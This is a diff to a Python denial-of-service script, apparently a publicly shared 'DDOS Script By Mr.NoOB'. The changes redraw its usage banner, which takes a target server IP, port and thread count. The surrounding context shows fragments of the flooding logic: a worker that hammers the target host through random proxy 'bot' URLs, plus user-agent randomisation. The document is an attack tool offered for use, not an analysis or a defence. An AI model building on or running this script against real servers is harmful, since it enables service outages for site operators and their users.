@@ -8,7 +8,7 @@
 
 from queue import Queue
 from optparse import OptionParser
-import time,sys,socket,threading,logging,urllib.request,random
+import time,sys,socket,threading,logging,urllib.request,random,os
 
 def user_agent():
 	global uagent
@@ -73,12 +73,27 @@ def dos2():
 		bot_hammering(random.choice(bots)+"http://"+host)
 		w.task_done()
 
-
+os.system('clear')
+time.sleep(1)
 def usage():
-	print (''' \033[92m	DDOS Script By Mr.NoOB
-	GREETINGS : PINOY EUTSEC
-	Facebook : Rafael Rodriguez \n
-	usage : python3 dos.py [-s] [-p] [-t]
+	print (''' \033[92m	
+
+    # # # # # # # # # # # # # # # # #
+    #        ____   ___  ____       #
+    #       |  _ \ / _ \/ ___|      #
+    #       | | | | | | \___ \      #
+    #       | |_| | |_| |___) |     #
+    #       |____/ \___/|____/ v1.0 #
+    #                               #
+    # # # # # # # # # # # # # # # # #
+	
+    \033[96m+++++++++++++++++++++++++++++++++++++\n
+	\033[96m+ \033[95mAuthor    : Mr.NoOB
+	\033[96m+ \033[95mGreetings : PINOY EUTSEC
+	\033[96m+ \033[95mFacebook  : Rafael Rodriguez
+		
+    \033[96m+++++++++++++++++++++++++++++++++++++\n
+	\033[94musage : python3 dos.py [-s] [-p] [-t]
 	-h : help
 	-s : server ip
 	-p : port default 80
